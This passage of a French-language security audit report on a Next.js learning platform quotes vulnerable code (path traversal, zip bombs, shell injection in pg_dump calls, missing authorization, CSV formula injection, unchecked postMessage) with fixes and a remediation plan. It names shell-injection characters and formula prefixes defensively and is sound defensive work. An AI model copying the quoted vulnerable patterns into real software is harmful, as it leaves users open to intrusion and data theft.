// src/app/api/assets/[...path]/route.ts:16-18
// Neutralise les path traversal
const safePath = segments.map((s) => s.replace(/\.\./g, "")).join("/");
const filePath = path.join(UPLOAD_DIR, safePath);
```

Le filtrage par liste noire est fragile par construction : il assainit avant de canoniser, ne traite pas les séparateurs (`\` sous Windows), ni les liens symboliques présents dans `uploads/`, et **aucune vérification de confinement ne suit**. La route de contenu H5P, elle, fait bien la vérification (`content/[...path]/route.ts:29`) — d'où l'incohérence.

Sur `public/assets`, le contrôle de préfixe (`ALLOWED_PREFIXES = ["branding/"]`) est appliqué à la chaîne assainie et non au chemin résolu, ce qui le rend dépendant du même filtrage fragile.

```ts
// Correction générique
import path from "path";
import { realpath } from "fs/promises";

const UPLOAD_ROOT = path.resolve(process.env.UPLOAD_DIR ?? "./uploads");

async function resolveInsideUploads(segments: string[], allowedPrefix?: string): Promise<string | null> {
  // Rejeter tout segment suspect au lieu de le réécrire
  if (segments.some((s) => !s || s === "." || s === ".." || s.includes("/") || s.includes("\\")))
    return null;

  const target = path.resolve(UPLOAD_ROOT, ...segments);
  const rel = path.relative(UPLOAD_ROOT, target);
  if (rel.startsWith("..") || path.isAbsolute(rel)) return null;          // confinement
  if (allowedPrefix && !rel.replace(/\\/g, "/").startsWith(allowedPrefix)) return null;

  // Neutraliser les liens symboliques sortants
  const real = await realpath(target).catch(() => null);
  if (!real) return null;
  const relReal = path.relative(UPLOAD_ROOT, real);
  if (relReal.startsWith("..") || path.isAbsolute(relReal)) return null;

  return real;
}
```

---

### M-03 🟡 Extraction d'archives sans limite (zip bomb) et écrasement de `uploads/`

**Fichiers :** `src/lib/h5p.ts:29-30` — `src/lib/backup.ts:94-95, 116-118`
**CWE :** CWE-409 (décompression sans limite), CWE-22 (zip slip)
**OWASP :** A05

```ts
// src/lib/h5p.ts:29-30
const zip = new AdmZip(zipBuffer);
zip.extractAllTo(extractDir, true);          // aucune limite de taille ni de nombre d'entrées
```

Un `.h5p` de quelques mégaoctets peut se décompresser en centaines de gigaoctets et remplir le disque (les cours acceptent jusqu'à 600 Mo compressés). La protection contre le zip slip repose entièrement sur `adm-zip` 0.5.17 : c'est correct pour cette version, mais le code ne fait aucune vérification propre — une régression ou un changement de version rétablirait la faille silencieusement.

`restoreBackup` supprime en plus l'intégralité de `uploads/` avant de recopier le contenu de l'archive (`backup.ts:116-118`) : une archive tronquée ou volontairement vide détruit tous les fichiers de l'instance.

```ts
// src/lib/h5p.ts — extraction contrôlée
const MAX_TOTAL   = 2 * 1024 * 1024 * 1024;   // 2 Go décompressés
const MAX_ENTRIES = 5_000;
const MAX_RATIO   = 100;                      // taux de compression suspect

const zip = new AdmZip(zipBuffer);
const entries = zip.getEntries();
if (entries.length > MAX_ENTRIES) throw new Error("Archive : trop d'entrées");

let total = 0;
for (const e of entries) {
  total += e.header.size;
  if (total > MAX_TOTAL) throw new Error("Archive : taille décompressée excessive");
  if (e.header.compressedSize > 0 && e.header.size / e.header.compressedSize > MAX_RATIO)
    throw new Error("Archive : taux de compression suspect");

  // Confinement explicite, indépendant de la bibliothèque
  const dest = path.resolve(extractDir, e.entryName);
  const rel  = path.relative(extractDir, dest);
  if (rel.startsWith("..") || path.isAbsolute(rel))
    throw new Error(`Archive : chemin hors périmètre (${e.entryName})`);
}
zip.extractAllTo(extractDir, true);
```

Pour la restauration : extraire dans un répertoire temporaire, vérifier la présence et la cohérence de `manifest.json` + `db.sql` + `uploads/`, puis **basculer par renommage atomique** au lieu de supprimer avant de copier.

---

### M-04 🟡 Interpolation shell dans `execSync` pour `pg_dump` / `psql`

**Fichier :** `src/lib/backup.ts:46-49, 108-111`
**CWE :** CWE-78 (injection de commande OS), CWE-88
**OWASP :** A03

```ts
// src/lib/backup.ts:46-49
execSync(
  `/usr/bin/pg_dump --clean --if-exists -h ${db.host} -p ${db.port} -U ${db.user} -d ${db.dbname} -f "${sqlPath}"`,
  { env, stdio: "pipe", timeout: 120_000 }
);
```

Les composants proviennent de `parseDbUrl(DATABASE_URL)` (`backup.ts:15-24`) et sont interpolés dans une chaîne exécutée par un shell. Le mot de passe est correctement passé par `PGPASSWORD` (bien vu), mais un nom de base, un utilisateur ou un hôte contenant `;`, `$(…)`, `` ` `` ou un espace casse la commande ou injecte une exécution. `DATABASE_URL` est certes une variable d'environnement — donc pas directement contrôlée par un utilisateur — mais l'exposition devient réelle dès qu'un déploiement génère cette URL depuis une valeur externe (secret manager, chart Helm, formulaire d'installation).

```ts
// src/lib/backup.ts
import { execFile } from "child_process";
import { promisify } from "util";
const execFileAsync = promisify(execFile);

await execFileAsync("/usr/bin/pg_dump", [
  "--format=custom",                 // -Fc : restaurable par pg_restore, cf. C-03
  "--no-owner", "--no-privileges",
  "-h", db.host, "-p", String(db.port), "-U", db.user, "-d", db.dbname,
  "-f", dumpPath,
], { env, timeout: 120_000 });
```

`execFile` sans shell rend l'injection impossible quel que soit le contenu des arguments. Noter aussi que le chemin `/usr/bin/pg_dump` est absent de l'image `node:20-alpine` (`Dockerfile`) : les sauvegardes échouent en conteneur — ajouter `RUN apk add --no-cache postgresql16-client` et utiliser `pg_dump` depuis le `PATH`.

---

### M-05 🟡 Quiz de n'importe quel cours modifiable par tout manager/creator

**Fichiers :** `src/app/api/admin/courses/[id]/questions/route.ts:19-26, 28-49` — `[qid]/route.ts:17, 32` — `import-csv/route.ts:20-21`
**CWE :** CWE-639, CWE-862
**OWASP :** A01

```ts
// src/app/api/admin/courses/[id]/questions/route.ts:19-26
async function canEditQuestions(userId: string | undefined, isAdmin: boolean) {
  if (!userId) return false;
  if (isAdmin) return true;
  const role = await prisma.userRole.findFirst({
    where: { userId, role: { name: { in: ["manager", "creator"] } } },
  });
  return role !== null;         // ← le courseId n'entre jamais dans la décision
}
```

Le contrôle porte sur le rôle global, jamais sur le cours visé. Or `src/app/api/admin/courses/[id]/route.ts:29-43` dispose déjà d'un `hasRightsOnCourse(userId, createdById)` correct : les deux logiques cohabitent sans être alignées. Un `creator` d'un service peut donc réécrire ou supprimer les questions du quiz d'un cours d'un autre service (`DELETE /questions/[qid]`), ou en importer par CSV, ce qui altère les évaluations et donc les certificats.

Correction : remplacer `canEditQuestions` par `canEditCourse(userId, sessionMode, courseId)` (cf. C-04), et l'appliquer aussi au `GET` (cf. C-02).

---

### M-06 🟡 Échéances d'affectation modifiables sur tout cours

**Fichier :** `src/app/api/courses/[id]/assign/route.ts:226-247` (`PATCH`), `11-38` (`GET`)
**CWE :** CWE-862, CWE-639
**OWASP :** A01

Le `PUT` de ce fichier fait un contrôle de propriété soigné (lignes 63-85 : cours créé par l'appelant, ou créateur membre d'une équipe qu'il dirige). Le `PATCH` juste en dessous s'arrête au rôle :

```ts
// src/app/api/courses/[id]/assign/route.ts:233-245
const isAdmin = session.user.sessionMode === "admin";
const allowed = isAdmin || await prisma.userRole.findFirst({
  where: { userId: session.user.id, role: { name: { in: ["manager", "creator"] } } },
});
if (!allowed) return NextResponse.json({ error: "Non autorisé" }, { status: 403 });
…
await prisma.courseAssignment.update({
  where: { userId_courseId: { userId, courseId } },     // couple entièrement fourni par le client
  data: { dueDate: dueDate ? new Date(dueDate) : null },
});
```

Tout manager/creator peut donc repousser ou supprimer l'échéance de n'importe quel apprenant sur n'importe quel cours — y compris pour masquer un retard de conformité. Le `GET` de la même route expose de plus la liste nominative (nom + email) des personnes affectées à un cours arbitraire.

Correction : appliquer le même bloc de vérification que le `PUT` (à extraire dans une fonction partagée), et restreindre le `GET` de la même manière.

---

### M-07 🟡 Annuaire complet des utilisateurs exposé aux managers et creators

**Fichier :** `src/app/api/admin/users/route.ts:12-39`
**CWE :** CWE-200 (exposition d'informations sensibles)
**OWASP :** A01

```ts
// src/app/api/admin/users/route.ts:16-27
const isAdmin = session.user.sessionMode === "admin";
if (!isAdmin) {
  const role = await prisma.userRole.findFirst({
    where: { userId: session.user.id, role: { name: { in: ["manager", "creator"] } } } });
  if (!role) return NextResponse.json({ error: "Non autorisé" }, { status: 403 });
}
const users = await prisma.user.findMany({          // ← aucun filtre de périmètre
  orderBy: { createdAt: "desc" }, include: { roles: { include: { role: true } } },
});
```

Un `creator` obtient l'annuaire intégral : noms, emails, rôles, statut actif et drapeau `isProtected` — qui désigne précisément le compte superadmin à cibler. Le reste du code sait pourtant restreindre par périmètre (`src/lib/document-scope.ts`, `src/app/api/assign/context/route.ts:20` qui filtre `isProtected: false`).

Correction : réutiliser `getDocumentScope` (ou une fonction équivalente pour les utilisateurs) afin de ne renvoyer que les membres des équipes concernées, et ne jamais exposer `isProtected` hors du mode admin.

---

### M-08 🟡 Injection de formules dans les exports CSV

**Fichiers :** `src/app/api/export/progress/route.ts:5-8` — `src/app/api/admin/export/route.ts:5-7` — `src/app/api/admin/certificates/export/route.ts:78` — `src/app/api/admin/courses/[id]/questions/export-csv/route.ts`
**CWE :** CWE-1236 (neutralisation incorrecte des éléments de formule dans un CSV)
**OWASP :** A03

```ts
// src/app/api/export/progress/route.ts:5-8
function esc(v: string | null | undefined) {
  if (v == null) return "";
  return `"${String(v).replace(/"/g, '""')}"`;      // guillemets seuls : pas de formule
}
```

L'échappement CSV est correct au sens du format, mais une valeur commençant par `=`, `+`, `-`, `@`, tabulation ou retour chariot est interprétée comme formule par Excel/LibreOffice à l'ouverture. Or ces exports contiennent des champs alimentés par les utilisateurs : `name` (profil), `courseTitle`, `category`, `question`. L'export certificats (ligne 78) concatène même certains champs sans passer par une fonction d'échappement.

```ts
function csvCell(v: unknown): string {
  let s = String(v ?? "");
  if (/^[=+\-@\t\r]/.test(s)) s = "'" + s;   // préfixe neutralisant
  return `"${s.replace(/"/g, '""')}"`;
}
```

Servir en outre ces réponses avec `Content-Type: text/csv; charset=utf-8` **et** `X-Content-Type-Options: nosniff`, et appliquer `csvCell` à *toutes* les colonnes, y compris dans l'export certificats.

---

### M-09 🟡 `postMessage` accepté sans vérification d'origine

**Fichiers :** `src/app/dashboard/courses/[id]/play/play-page-client.tsx:61-113` — `src/app/api/courses/[id]/serve/route.ts:107-111` (émission en `'*'`)
**CWE :** CWE-346 (vérification d'origine incorrecte), CWE-940
**OWASP :** A04

```ts
// play-page-client.tsx:61-66
function handleMessage(e: MessageEvent) {
  if (e.data?.type === "h5p-completed") {           // ni e.origin ni e.source vérifiés
    const visited: number[] = e.data.visited ?? [];
    const h5pScore = e.data.h5pScore ?? null;
    void fetch(`/api/courses/${courseId}/progress`, { method: "POST", … });
```

Et l'émetteur diffuse vers n'importe quelle origine :

```js
// serve/route.ts:107-111
window.parent.postMessage({ type: 'h5p-completed', visited: …, total: … }, '*');
```

Toute fenêtre disposant d'une référence sur la page du lecteur (contenu H5P malveillant, fenêtre ouverte via `window.open`) peut donc déclencher la complétion et transmettre un `h5pScore` arbitraire. C'est le pendant client de C-02 ; corriger le serveur reste la mesure décisive, mais ce contrôle doit également être posé.

```ts
// play-page-client.tsx
function handleMessage(e: MessageEvent) {
  if (e.origin !== window.location.origin) return;              // même origine uniquement
  if (e.source !== iframeRef.current?.contentWindow) return;    // et bien notre iframe
  …
}
```

```js
// serve/route.ts — cibler explicitement l'origine du parent
window.parent.postMessage({ … }, window.location.origin);
```

---

### M-10 🟡 Secrets SMTP, Graph et cron stockés en clair en base

**Fichiers :** `prisma/schema.prisma:304-322` (`smtpPass`, `graphClientSecret`, `cronSecret`) — `src/app/api/admin/mail-settings/route.ts:73-75` — `src/lib/mail-config.ts:40, 44, 46`
**CWE :** CWE-256 (stockage de mot de passe en clair), CWE-312
**OWASP :** A02

L'API fait correctement l'effort de ne jamais **renvoyer** les secrets (`mail-settings/route.ts:15-32` : `hasSmtpPass: !!s.smtpPass`), mais ils sont **écrits tels quels** :

```ts
// src/app/api/admin/mail-settings/route.ts:73-75
...(body.smtpPass ? { smtpPass: body.smtpPass } : {}),
...(body.graphClientSecret ? { graphClientSecret: body.graphClientSecret } : {}),
...(body.cronSecret ? { cronSecret: body.cronSecret } : {}),
```

Toute lecture de la base — sauvegarde téléchargée (cf. M-11), accès `prisma studio`, dump volé — livre le mot de passe de la boîte d'envoi (donc l'usurpation d'identité par email de l'organisation), le secret client Azure AD (accès `Mail.Send` sur le tenant) et le secret cron (qui, avec C-01 corrigé, contrôle les sauvegardes et les purges).

Correction : chiffrer ces trois colonnes avec la même primitive que la `contentKey` après correction de H-07 (`deriveKey("mail-secrets")`), en conservant un octet de version pour la migration :

```ts
import { encryptSecret, decryptSecret } from "@/lib/crypto-keys";

// écriture
...(body.smtpPass ? { smtpPass: encryptSecret(body.smtpPass) } : {}),

// lecture, dans mergeWithEnv()
smtpPass: db?.smtpPass ? decryptSecret(db.smtpPass) : process.env.MAIL_PASS || null,
```

---

### M-11 🟡 Sauvegardes non chiffrées contenant l'intégralité des secrets

**Fichiers :** `src/lib/backup.ts:30-85` — `src/app/api/admin/backup/[id]/download/route.ts:20-27`
**CWE :** CWE-311 (absence de chiffrement de données sensibles), CWE-522
**OWASP :** A02

L'archive produite contient le dump SQL complet — donc les hachages de mots de passe, la clé privée RSA d'instance, la `contentKey` de licence, les secrets SMTP/Graph/cron — plus tout `uploads/`. Elle est écrite en clair sur le disque (`BACKUP_DIR`), référencée en base avec son chemin absolu, et téléchargeable par tout compte en mode admin :

```ts
// src/app/api/admin/backup/[id]/download/route.ts:20-27
const buffer = fs.readFileSync(record.filePath);
return new NextResponse(buffer, {
  headers: { "Content-Type": "application/zip",
             "Content-Disposition": `attachment; filename="${record.filename}"`, … },
});
```

Un unique compte admin compromis exfiltre ainsi l'ensemble du système en une requête — y compris le matériel cryptographique qui protège le contenu DRM. Le nom de fichier est de plus interpolé sans échappement dans `Content-Disposition` (injection d'en-tête si un nom contient `"` ou CRLF ; ici il est généré par le serveur, d'où la sévérité modérée).

Correction :
- chiffrer l'archive (AES-256-GCM avec une clé dédiée conservée hors base, ou `age`/GPG avec une clé publique d'exploitation), de sorte que le fichier soit inutile sans la clé de restauration ;
- exclure du dump les secrets qui n'ont pas à voyager, ou les rechiffrer avec la clé de sauvegarde ;
- journaliser tout téléchargement (`auditLog` absent sur cette route) et exiger une reconfirmation du mot de passe ;
- `filename*=UTF-8''${encodeURIComponent(record.filename)}` pour l'en-tête.

---

### M-12 🟡 Application exposée en clair hors du reverse proxy TLS

**Fichiers :** `docker-compose.yml:23-27` — `Caddyfile:1-13`
**CWE :** CWE-319 (transmission d'informations sensibles en clair)
**OWASP :** A05

```yaml
# docker-compose.yml — service app
    ports:
      - "4000:3000"        # ← publié sur l'hôte, en HTTP, hors du proxy
```

Caddy termine le TLS et relaie vers `app:3000`, mais le service applicatif publie aussi son port en clair sur l'hôte. Le port 4000 court-circuite donc le TLS, les en-têtes de sécurité et toute limitation de débit posée sur le proxy — y compris pour les endpoints d'installation (cf. C-03) et cron (cf. C-01). Par ailleurs, `local_certs` / `tls internal` génère un certificat auto-signé : les utilisateurs prennent l'habitude de passer outre l'avertissement, ce qui neutralise la protection contre l'interception.

```yaml
  app:
    …
    expose:
      - "3000"          # visible des autres services, pas publié sur l'hôte
    # ports: supprimé
```

Et pour la production, remplacer `local_certs` par un vrai domaine afin que Caddy obtienne un certificat Let's Encrypt :

```caddyfile
lms.mon-domaine.fr {
  reverse_proxy app:3000
  header { Strict-Transport-Security "max-age=31536000; includeSubDomains" … }
}
```

Vérifier aussi que `POSTGRES_PASSWORD` et `AUTH_SECRET` sont fournis par un `.env` non versionné (c'est le cas) et que la base n'expose aucun port sur l'hôte (c'est le cas — bon point).

---

### M-13 🟡 Server Actions accessibles sans authentification

**Fichiers :** `src/actions/license-cookie.ts:5-21` — `src/lib/actions/session.ts:1-7`
**CWE :** CWE-306, CWE-862
**OWASP :** A01

Une fonction `"use server"` importée par un composant client devient un **endpoint HTTP** appelable directement. Les deux fichiers ci-dessous n'ont aucun contrôle d'accès.

```ts
// src/actions/license-cookie.ts:5-16 — importée par components/license-cookie-setter.tsx
export async function setLicenseCookieAction(expiresAt: string | null) {
  const cookieStore = await cookies();
  const expires = expiresAt ? new Date(expiresAt)
                            : new Date(Date.now() + 365 * 24 * 60 * 60 * 1000);
  cookieStore.set("lms-lic", "1", { expires, path: "/", httpOnly: true, sameSite: "lax" });
}
```

Exposée et non authentifiée, avec une date d'expiration fournie par l'appelant. L'impact est aujourd'hui nul car aucun code ne **lit** ce cookie (le contrôle de licence est fait côté serveur dans `src/app/dashboard/layout.tsx:28-41`) : c'est du code mort. Il deviendra une faille dès que le cookie servira de raccourci.

Plus préoccupant, ce fichier n'est actuellement importé par aucun composant :

```ts
// src/lib/actions/session.ts:5-7
export async function setSessionMode(mode: "admin" | "user") {
  await updateSession({ sessionMode: mode } as …);     // aucun contrôle de rôle
}
```

C'est le doublon non protégé de `/api/auth/session-mode` (qui, lui, vérifie le rôle **et** reconfirme le mot de passe). Comme il n'est importé nulle part, Next.js ne l'expose pas aujourd'hui. Le jour où un composant client l'importera, **tout utilisateur authentifié pourra devenir admin en un appel** — c'est-à-dire l'élévation de privilèges la plus directe possible dans cette application, puisque ~40 routes ne vérifient que `sessionMode === "admin"`.

Correction :
- **supprimer `src/lib/actions/session.ts`** (le chemin correct existe déjà) ;
- supprimer `src/actions/license-cookie.ts` et `src/components/license-cookie-setter.tsx` si le cookie n'a plus d'usage, sinon authentifier et valider l'entrée ;
- règle générale à inscrire dans les conventions du projet : **toute fonction `"use server"` commence par `const session = await auth()` et une vérification d'autorisation**, exactement comme une route d'API.

```ts
"use server";
export async function setLicenseCookieAction(expiresAt: string | null) {
  const session = await auth();
  const roles = session?.user?.roles ?? [];
  if (!session?.user?.id || !(roles.includes("admin") || roles.includes("superadmin")))
    throw new Error("Non autorisé");

  const parsed = expiresAt ? new Date(expiresAt) : null;
  if (parsed && (Number.isNaN(+parsed) || +parsed > Date.now() + 400 * 86_400_000))
    throw new Error("Date invalide");
  …
}
```

---

## 5. Constats de sévérité faible

### L-01 🔵 Messages d'erreur internes renvoyés au client

**Fichiers :** `src/app/api/setup/restore/route.ts:34` — `src/app/api/admin/restore/route.ts:45` — `src/app/api/cron/backup/route.ts:21` — `src/app/api/admin/courses/upload/route.ts:201-202` — `src/app/api/courses/[id]/serve/route.ts:42-50`

`return NextResponse.json({ error: String(err) }, { status: 500 })` renvoie le message d'exception brut : chemins absolus (`/data/uploads/...`), sortie de `psql`, messages Prisma révélant la structure des tables. Cela facilite la cartographie du serveur. Correction : journaliser le détail côté serveur (`console.error` + `auditLog`) et renvoyer un message générique avec un identifiant de corrélation.

```ts
} catch (err) {
  const ref = randomUUID();
  console.error(`[restore ${ref}]`, err);
  return NextResponse.json(
    { error: "La restauration a échoué.", ref }, { status: 500 });
}
```

Dans `serve/route.ts:46`, `${msg}` est de plus interpolé dans du HTML sans échappement : appliquer un échappement ou renvoyer un texte fixe.

### L-02 🔵 Vignettes de cours servies sans contrôle en route

**Fichier :** `src/app/api/courses/[id]/thumbnail/route.ts:10-16`

La route ne vérifie ni session ni affectation ; elle n'est protégée que par le middleware global. Cette protection existe bien aujourd'hui (le chemin n'est pas dans la liste blanche de `src/middleware.ts:9-16`), mais toute évolution du `matcher` la ferait disparaître silencieusement — et les vignettes de documents PDF peuvent révéler la première page d'un document confidentiel. Ajouter `const session = await auth(); if (!session) …` en tête, comme le fait `src/app/api/documents/[id]/thumbnail/route.ts:13-15`.

### L-03 🔵 `trustHost: true` sans `AUTH_URL` défini

**Fichier :** `src/lib/auth.ts:13`

```ts
// Accepte n'importe quel host : localhost, IP locale, domaine HTTPS
trustHost: true,
```

Le commentaire assume le compromis, et il est justifié pour un déploiement multi-adresses. Conséquence : l'en-tête `Host` fourni par le client devient la base des URL de rappel. Derrière Caddy, le risque est faible ; si l'application est exposée directement (cf. M-12), un `Host` falsifié peut détourner une redirection ou empoisonner un lien envoyé par email. Correction : définir `AUTH_URL` en production (le `.env.example` le mentionne déjà en commentaire) et faire imposer le `Host` par le proxy.

### L-04 🔵 IV GCM de 16 octets et conversion UTF-8 fragile de la clé

**Fichier :** `src/lib/instance-crypto.ts:28, 36, 48`

`GCM_IV_LEN = 16` : AES-GCM est spécifié pour un IV de 96 bits ; au-delà, l'IV passe par GHASH, ce qui reste sûr mais s'écarte de la norme et complique l'interopérabilité. Surtout, la dérivation de clé fait un aller-retour octets → chaîne → octets :

```ts
const key = Buffer.from(secret).subarray(0, 32).toString().padEnd(32, "0").slice(0, 32);
const keyBuf = Buffer.from(key, "utf-8");
```

Avec un secret non ASCII, la troncature à 32 octets peut couper un caractère multi-octets : `toString()` produit alors un caractère de remplacement et `keyBuf` ne fait plus 32 octets — `createCipheriv` lève `Invalid key length` et **tout le chiffrement de contenu cesse de fonctionner**, ce qui est déjà arrivé en pratique sur d'autres bases de code. La correction proposée en H-07 (HKDF sur les octets bruts) résout les deux points ; passer l'IV à 12 octets avec l'octet de version pour la compatibilité ascendante.

### L-05 🔵 Échecs d'écriture du journal d'audit silencieux

**Fichier :** `src/lib/audit.ts:35-37, 54-56`

Les deux chemins d'écriture (fichier et base) avalent toute exception : `catch { /* Ne jamais faire échouer l'opération principale */ }`. Le choix est défendable pour la disponibilité, mais il rend l'audit silencieusement inopérant (disque plein, permissions, base indisponible) sans aucune alerte. Correction : conserver le `catch` mais émettre un `console.error` structuré et un compteur exposé à la supervision ; pour les actions à valeur probante (signature de document, délivrance de certificat, restauration), envisager de faire échouer l'opération si son audit n'a pas pu être écrit.

---

## 6. Points positifs

Ces éléments sont à préserver lors des corrections :

- **Aucune injection SQL** — Prisma est utilisé partout, sans `$queryRaw` ni `$executeRaw` ; les identifiants ne sont jamais concaténés dans des requêtes.
- **Bcrypt à coût 12** appliqué de façon cohérente (création, réinitialisation, changement de mot de passe, import), avec `bcrypt.compare` systématique.
- **Politique de mot de passe** centralisée (`src/lib/password.ts`) et appliquée à l'installation, à la modification par un admin et au changement de mot de passe utilisateur.
- **Passage en mode admin correctement gardé à l'entrée** (`src/app/api/auth/session-mode/route.ts:16-38`) : rôle vérifié en base *et* mot de passe reconfirmé — c'est une bonne pratique de réauthentification pour opération sensible.
- **`src/app/api/documents/[id]/serve/route.ts`** est le bon modèle de contrôle d'accès aux fichiers : rôle, affectation, audit anti-doublon, `no-store`, `nosniff`. Les routes de cours devraient s'en inspirer (cf. H-02).
- **`getDocumentScope`** (`src/lib/document-scope.ts`) implémente proprement un périmètre manager/creator réutilisable — à généraliser aux utilisateurs et aux cours.
- **Secrets d'API jamais renvoyés au client** dans `mail-settings` (`hasSmtpPass: !!s.smtpPass`) : le réflexe est bon, il ne manque que le chiffrement au repos.
- **`.gitignore`** couvre correctement `.env`, `uploads/`, `backups/`, `*.pem`.
- **Uploads en flux avec plafonds de taille** via Busboy (600 Mo H5P, 200 Mo PPTX, 100 Mo PDF) plutôt qu'en mémoire, et `execFile` (sans shell) pour les scripts Python de conversion : le réflexe anti-injection est présent là où il compte le plus.
- **Comptes protégés** (`isProtected`) et refus de s'auto-désactiver/supprimer : la logique existe, il faut l'appliquer partout (cf. H-05).
- **Architecture DRM pensée** : clés RSA par instance, enveloppe double (clé de fichier chiffrée à la fois par la clé d'instance et par la `contentKey` de licence), chaîne d'historique pour la récupération après réinstallation, manifeste signé RSA-PSS. La conception est solide ; ce sont l'application des contrôles d'accès (H-02) et la dérivation de clé (H-07) qui doivent être reprises.

---

## 7. Plan de remédiation

### Vague 1 — à traiter immédiatement (1 à 2 jours)

Les cinq critiques sont indépendantes et les correctifs sont courts.

| Ordre | Constat | Action | Effort |
|---|---|---|---|
| 1 | C-01 | Secret cron + `POST` sur `purge-logs` | 30 min |
| 2 | C-05 | Retirer le compte semé ; désactiver `admin` sur les instances existantes | 30 min |
| 3 | C-04 | `canEditCourse` sur `native-video` POST/PUT | 1 h |
| 4 | C-02 | Correction serveur du quiz + retrait de `correctAnswer` du flux apprenant | 4 h |
| 5 | C-03 | Jeton d'installation + `pg_restore` au lieu de `psql -f` | 4 h |

### Vague 2 — sous une semaine

| Constat | Action | Effort |
|---|---|---|
| H-09 | `npm audit fix` (+ `--force` pour nodemailer) et tests de non-régression | 2 h |
| H-10 | Désindexer `logs/`, purger l'historique Git, coordonner le `push --force` | 2 h |
| H-02 | `canReadCourse` sur `serve`, `content`, `stream`, `quiz` | 3 h |
| H-05 | Garde `isProtected` + hiérarchie de rôles sur la réinitialisation | 1 h |
| H-06 | `randomInt` + Fisher-Yates dans `generateStrongPassword` | 30 min |
| H-01 | Revalidation du jeton en base, expiration du mode admin | 4 h |
| H-08 | Limitation des tentatives d'authentification | 4 h |
| M-13 | Supprimer `src/lib/actions/session.ts` et l'action cookie non utilisée | 30 min |

### Vague 3 — sous un mois

| Constat | Action | Effort |
|---|---|---|
| H-07, L-04, M-10 | Module `crypto-keys` (HKDF + séparation de domaine), migration versionnée, chiffrement des secrets mail | 1 j |
| H-03, H-04, M-01 | CSP + en-têtes, `sandbox` sur l'iframe, liste blanche MIME, retrait du SVG | 1 j |
| M-02, M-03 | Confinement des chemins et extraction bornée | 4 h |
| M-04 | `execFile` pour `pg_dump`/`pg_restore` + client Postgres dans l'image | 3 h |
| M-05, M-06, M-07 | Généraliser `canEditCourse` / périmètre utilisateurs | 1 j |
| M-08, M-09, M-11, M-12, L-01…L-05 | Durcissements ciblés | 1 j |

### Vague 4 — recommandations structurelles

1. **Un seul point de décision d'autorisation.** Créer `src/lib/authz.ts` exposant `requireAdmin`, `canEditCourse`, `canReadCourse`, `canEditQuestions`, `getUserScope`, et interdire par revue toute vérification `sessionMode === "admin"` écrite en ligne dans une route. L'audit a trouvé au moins six variantes différentes du même contrôle — c'est la cause racine de la majorité des constats A01.
2. **Validation d'entrée systématique.** Introduire Zod (ou équivalent) sur chaque corps de requête. Aujourd'hui, `await req.json()` est déstructuré directement dans une trentaine de routes, sans typage à l'exécution — c'est ce qui rend C-02 exploitable.
3. **Tests d'autorisation automatisés.** Un jeu de tests par rôle (`learner`, `creator`, `manager`, `admin`, `superadmin`) × endpoint, vérifiant les 403 attendus. C'est le seul moyen d'empêcher la réapparition des incohérences constatées.
4. **CI de sécurité.** `npm audit --audit-level=high`, `eslint-plugin-security`, analyse statique sur les diffs, et une revue obligatoire pour tout nouveau fichier `"use server"` ou route sous `/api/`.
5. **Journal d'audit inviolable.** Chaînage HMAC des entrées (chaque ligne signe le condensat de la précédente), en cohérence avec la piste « ratchet HMAC » déjà envisagée pour l'anti-manipulation d'horloge. Cela adresse la cause profonde de C-01 : aujourd'hui une suppression est indétectable.
6. **Second facteur pour les comptes privilégiés.** TOTP sur `admin`/`superadmin`, en lieu et place de la seule reconfirmation de mot de passe pour le passage en mode admin.

---

## 8. Annexes

### 8.1 Couverture OWASP Top 10 2021

| Catégorie | Constats | Appréciation |
|---|---|---|
| A01 Broken Access Control | C-01, C-03, C-04, H-01, H-02, H-05, H-10, M-02, M-05, M-06, M-07, M-13, L-02 | **Faiblesse principale** — modèle d'autorisation incohérent entre routes |
| A02 Cryptographic Failures | H-06, H-07, M-10, M-11, L-04 | Conception correcte, dérivation et stockage à reprendre |
| A03 Injection | C-03, H-03, H-04, M-04, M-08 | Pas d'injection SQL ; XSS et injection de commande présentes |
| A04 Insecure Design | C-02, M-09 | Logique métier de réussite déportée côté client |
| A05 Security Misconfiguration | M-01, M-03, M-12, L-01, L-03 | En-têtes absents, exposition réseau |
| A06 Vulnerable Components | H-09 | 10 vulnérabilités, correctifs disponibles |
| A07 Auth Failures | C-05, H-01, H-08 | Identifiants par défaut, pas de limitation de tentatives |
| A08 Data Integrity Failures | C-03, M-03 | Restauration d'archive non vérifiée |
| A09 Logging Failures | C-01, H-10, L-05 | Journal supprimable sans authentification |
| A10 SSRF | — | Aucun constat direct ; voir H-09 (avis Next.js) |

### 8.2 Sortie `npm audit` (25/07/2026)

```
10 vulnerabilities (8 high, 2 critical)

@auth/core   <0.41.3    critical  (homoglyphe @, liaison cookies OAuth, DoS Bearer)
next         <=16.3.0   high      (endpoints Server Functions, SSRF, cache confusion, DoS)
nodemailer   <=9.0.0    high      (injection SMTP, CRLF en-têtes, TLS OAuth2)
postcss      <=8.5.17   high      (XSS </style>, lecture fichier via sourceMappingURL)
sharp        <0.35.0    high      (libvips CVE-2026-33327/33328/35590/35591)
js-yaml      4.0.0-4.2.0 high     (DoS quadratique merge keys)
brace-expansion            —      (transitive, chaîne ESLint)
```

### 8.3 Fichiers audités

`src/` intégralement (94 routes d'API, 12 modules `lib/`, middleware, composants clients porteurs de logique de sécurité), `prisma/schema.prisma`, `prisma/seed.ts`, `next.config.ts`, `Dockerfile`, `docker-compose.yml`, `Caddyfile`, `docker-entrypoint.sh`, `.gitignore`, `.env.example`, `package.json`.

Non audités : `h5p-libraries/` et `public/h5p-standalone/` (code tiers, non modifié par le projet — noter toutefois que ces bibliothèques sont servies en même origine, cf. H-03), `lms-license-cli/index.js` (outil hors ligne côté éditeur, non exposé), `node_modules/`.

### 8.4 Limites de cet audit

- **Revue statique uniquement.** Aucune exploitation n'a été tentée sur une instance en fonctionnement ; les scénarios décrits sont déduits du code. Les constats C-01, C-02, C-04 et H-05 sont directement lisibles dans le code et ne nécessitent pas de validation dynamique. C-03 mérite une confirmation en environnement de test (comportement exact de `psql -f` sur l'image utilisée).
- **Pas de test d'intrusion réseau** (configuration PostgreSQL, segmentation, durcissement de l'hôte, sauvegardes hors site).
- **Périmètre applicatif.** L'audit ne couvre pas la conformité RGPD au-delà du constat H-10 (registre des traitements, durées de conservation, information des personnes, sous-traitance email).
- **Volume.** Sur ~94 routes, la revue a été exhaustive sur les contrôles d'accès et les flux de fichiers/chiffrement ; les pages de rendu (`dashboard/**/page.tsx`) ont été examinées pour les fuites de données mais pas ligne par ligne.

---

*Rapport généré le 25 juillet 2026 — audit en lecture seule, aucun fichier de code modifié.*
